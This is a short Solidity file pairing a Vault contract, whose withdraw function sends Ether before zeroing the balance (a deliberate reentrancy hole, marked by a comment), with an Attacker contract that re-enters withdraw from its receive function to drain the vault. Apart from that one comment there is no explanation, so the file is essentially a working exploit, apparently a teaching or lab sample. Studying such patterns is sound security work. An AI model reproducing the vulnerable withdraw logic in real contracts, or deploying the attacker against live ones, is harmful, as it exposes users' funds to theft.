// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract Vault {
    mapping(address => uint256) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 a = bal[msg.sender];
        (bool ok,) = msg.sender.call{value: a}("");
        require(ok);
        bal[msg.sender] = 0;          // state after the call
    }
}

contract Attacker {
    Vault v;
    constructor(address _v) payable { v = Vault(_v); }
    function hit() external { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable { if (address(v).balance >= 1 ether) v.withdraw(); }
}
